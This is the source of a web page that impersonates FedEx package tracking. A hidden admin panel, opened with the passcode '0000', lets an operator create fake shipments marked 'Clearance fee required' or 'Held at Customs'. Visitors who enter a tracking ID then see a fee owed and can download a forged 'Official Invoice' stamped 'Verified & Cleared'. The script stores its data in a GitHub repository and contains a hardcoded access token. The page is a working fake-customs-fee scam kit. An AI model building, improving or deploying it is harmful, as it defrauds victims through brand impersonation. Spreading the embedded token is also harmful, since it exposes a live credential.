<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>FedEx | Official Global Tracking</title>
    
    <meta name="description" content="Official FedEx tracking portal. Enter your ID for real-time shipment updates.">
    <meta property="og:title" content="FedEx | Package Tracking">
    <meta property="og:image" content="https://newsroom.fedex.com/wp-content/uploads/2021/05/FedEx-Truck.jpg">
    <meta property="og:type" content="website">

    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        :root { --p: #4D148C; --o: #FF6200; --bg: #f8f9fa; }
        body { font-family: 'Segoe UI', sans-serif; margin: 0; background: var(--bg); color: #333; }
        .nav { background: var(--p); padding: 15px; color: white; display: flex; justify-content: space-between; align-items: center; position: sticky; top:0; z-index:999; }
        .logo { font-size: 24px; font-weight: 900; cursor: pointer; }
        .wrapper { padding: 15px; max-width: 480px; margin: auto; }
        .card { background: white; border-radius: 12px; padding: 25px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); margin-top: 20px; }
        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; box-sizing: border-box; outline: none; }
        .btn { width: 100%; padding: 16px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; }
        .btn-o { background: var(--o); color: white; }
        
        #result { display: none; margin-top: 20px; border-top: 1px solid #eee; padding-top: 20px; }
        .status-box { padding: 12px; border-radius: 6px; text-align: center; font-weight: bold; margin-bottom: 20px; border: 1px solid #ddd; text-transform: uppercase; font-size: 14px; }
        .row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #f0f0f0; font-size: 14px; }
        .pkg-img { width: 100%; border-radius: 10px; margin-top: 20px; display: none; border: 1px solid #eee; }
        
        #pay-box { display: none; margin-top: 20px; padding: 15px; background: #fff3cd; border-radius: 8px; color: #856404; border-left: 5px solid #ffc107; }

        /* NO-SCROLL INVOICE OVERLAY */
        #invoice-overlay { 
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(0,0,0,0.85); z-index: 10000; align-items: center; justify-content: center;
        }
        #invoice-capture { 
            background: white; width: 90%; max-width: 380px; padding: 15px; border-radius: 4px; box-sizing: border-box; 
        }
        .inv-header { display: flex; justify-content: space-between; border-bottom: 3px solid var(--p); padding-bottom: 8px; margin-bottom: 12px; }
        .stamp { border: 2px solid #d00; color: #d00; padding: 4px 8px; font-weight: 900; text-transform: uppercase; transform: rotate(-10deg); display: inline-block; font-size: 12px; margin: 10px 0; }
        .inv-table { width: 100%; border-collapse: collapse; font-size: 11px; margin: 10px 0; }
        .inv-table th { text-align: left; border-bottom: 1px solid #333; }
        .inv-table td { padding: 6px 0; border-bottom: 1px solid #eee; }
        .total-row { text-align: right; font-weight: bold; font-size: 15px; margin-top: 8px; border-top: 2px solid #000; padding-top: 4px; }

        #admin-panel { display: none; background: #1a1a1a; color: white; padding: 20px; border-radius: 12px; margin-top: 20px; }
        #admin-panel input, #admin-panel select { background: #333; color: white; border: 1px solid #444; }
    </style>
</head>
<body>

<div class="nav">
    <div class="logo" onclick="openAdmin()">Fed<span style="color:var(--o)">ex</span></div>
    <div style="font-size:11px; opacity:0.8;">Secure Tracking</div>
</div>

<div class="wrapper">
    <div class="card" id="client-view">
        <h2 style="margin:0 0 10px 0; color:var(--p)">Track Package</h2>
        <input type="text" id="trackInput" placeholder="Tracking ID (e.g. FDX-5755)">
        <button class="btn btn-o" id="mainTrackBtn" onclick="handleTracking()">TRACK</button>

        <div id="result">
            <div id="st-badge" class="status-box"></div>
            <div class="row"><span>Recipient:</span> <b id="r-name"></b></div>
            <div class="row"><span>Route:</span> <b><span id="r-origin"></span> ➔ <span id="r-dest"></span></b></div>
            <div class="row"><span>Date:</span> <b id="r-date"></b></div>
            <img id="r-img" class="pkg-img">
            
            <div id="pay-box">
                <p id="pay-msg"></p>
                <button class="btn" style="background:#333; color:white;" onclick="previewAndDownload()">DOWNLOAD INVOICE</button>
            </div>
        </div>
    </div>

    <div id="admin-panel">
        <h3>Admin Panel</h3>
        <input type="text" id="a-code" placeholder="Tracking ID">
        <input type="text" id="a-name" placeholder="Client Name">
        <input type="text" id="a-origin" placeholder="Origin">
        <input type="text" id="a-dest" placeholder="Destination">
        <input type="number" id="a-fee" placeholder="Fee ($)">
        <select id="a-status">
            <option value="In Transit">In Transit</option>
            <option value="Arrived (Clearance fee required)">Arrived (Clearance fee required)</option>
            <option value="Held at Customs">Held at Customs</option>
        </select>
        <input type="file" id="a-file" accept="image/*">
        <button class="btn btn-o" onclick="saveToCloud()">SAVE SHIPMENT</button>
        <button class="btn" style="margin-top:10px; background:#444; color:white;" onclick="location.reload()">EXIT</button>
    </div>
</div>

<div id="invoice-overlay" onclick="this.style.display='none'">
    <div id="invoice-capture">
        <div class="inv-header">
            <div><b style="color:var(--p); font-size:20px;">FedEx<span style="color:var(--o)">.</span></b></div>
            <div style="text-align:right"><b style="font-size:11px;">OFFICIAL INVOICE</b></div>
        </div>
        <div style="font-size:10px; margin-bottom:10px;">
            <b>ID:</b> <span id="inv-code"></span><br>
            <b>BILL TO:</b> <span id="inv-name"></span><br>
            <b>DATE:</b> <span id="inv-date"></span>
        </div>
        <div style="text-align:center;"><div class="stamp">Verified & Cleared</div></div>
        <table class="inv-table">
            <thead><tr><th>Description</th><th>Total</th></tr></thead>
            <tbody><tr><td>International Customs & Regulatory Fees</td><td>$<span id="inv-fee"></span></td></tr></tbody>
        </table>
        <div class="total-row">TOTAL: $<span id="inv-fee-total"></span></div>
        <div style="margin-top:15px; font-size:8px; color:#666; border-top:1px solid #eee; padding-top:8px;">
            Notice: Settlement is required for release. This is an official electronic document.
        </div>
    </div>
</div>

<script>
    const U = "fedex-trackshippingcode";
    const R = "fedex-trackshippingcode";
    const KEY = "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";

    function openAdmin() { if(prompt("Auth")==="0000"){ document.getElementById('client-view').style.display='none'; document.getElementById('admin-panel').style.display='block'; } }

    async function handleTracking() {
        const btn = document.getElementById('mainTrackBtn'), input = document.getElementById('trackInput').value;
        if(!input) return; btn.innerText = "SEARCHING...";
        setTimeout(async () => { await startTracking(input); btn.innerText = "TRACK"; }, 2000);
    }

    async function startTracking(input) {
        const res = await fetch(`https://api.github.com/repos/${U}/${R}/contents/data.json?v=${Date.now()}`, { headers: { "Authorization": `token ${KEY}` } });
        if(!res.ok) return alert("System database not initialized. Add a shipment first.");
        const file = await res.json(); const data = JSON.parse(atob(file.content)); const s = data[input];
        if(s) {
            document.getElementById('result').style.display = 'block';
            document.getElementById('st-badge').innerText = s.status;
            document.getElementById('r-name').innerText = s.name;
            document.getElementById('r-origin').innerText = s.origin;
            document.getElementById('r-dest').innerText = s.dest;
            document.getElementById('r-date').innerText = s.date;
            if(s.img){ document.getElementById('r-img').src = s.img; document.getElementById('r-img').style.display='block'; }
            if(s.status.includes("Arrived") || s.status.includes("Clearance")) {
                document.getElementById('pay-box').style.display='block';
                document.getElementById('pay-msg').innerHTML = `<b>Fee Outstanding:</b> $${s.fee}`;
                document.getElementById('inv-code').innerText = input;
                document.getElementById('inv-name').innerText = s.name;
                document.getElementById('inv-fee').innerText = s.fee;
                document.getElementById('inv-fee-total').innerText = s.fee;
                document.getElementById('inv-date').innerText = s.date;
            }
        } else alert("Tracking ID not found.");
    }

    function previewAndDownload() {
        document.getElementById('invoice-overlay').style.display='flex';
        setTimeout(() => {
            html2canvas(document.getElementById('invoice-capture'), { scale: 3 }).then(canvas => {
                const link = document.createElement('a'); link.download = 'Official_Invoice.png'; link.href = canvas.toDataURL(); link.click();
            });
        }, 1200);
    }

    async function saveToCloud() {
        const id = document.getElementById('a-code').value, fileInput = document.getElementById('a-file').files[0];
        if(!id) return alert("Enter Tracking ID");
        let imgBase64 = "";
        if(fileInput) imgBase64 = await new Promise(r => { const reader = new FileReader(); reader.onload = () => r(reader.result); reader.readAsDataURL(fileInput); });
        const payload = {
            name: document.getElementById('a-name').value, origin: document.getElementById('a-origin').value,
            dest: document.getElementById('a-dest').value, fee: document.getElementById('a-fee').value,
            status: document.getElementById('a-status').value, img: imgBase64, date: new Date().toLocaleDateString('en-GB')
        };
        const url = `https://api.github.com/repos/${U}/${R}/contents/data.json`;
        let db = {}, sha = null;
        const check = await fetch(url, { headers: { "Authorization": `token ${KEY}` } });
        if(check.ok) { const existing = await check.json(); db = JSON.parse(atob(existing.content)); sha = existing.sha; }
        db[id] = payload;
        await fetch(url, { method: "PUT", headers: { "Authorization": `token ${KEY}` }, body: JSON.stringify({ message: "Update", content: btoa(unescape(encodeURIComponent(JSON.stringify(db, null, 2)))), sha: sha }) });
        alert("Shipment Saved! You can now track it."); location.reload();
    }
</script>
</body>
</html>
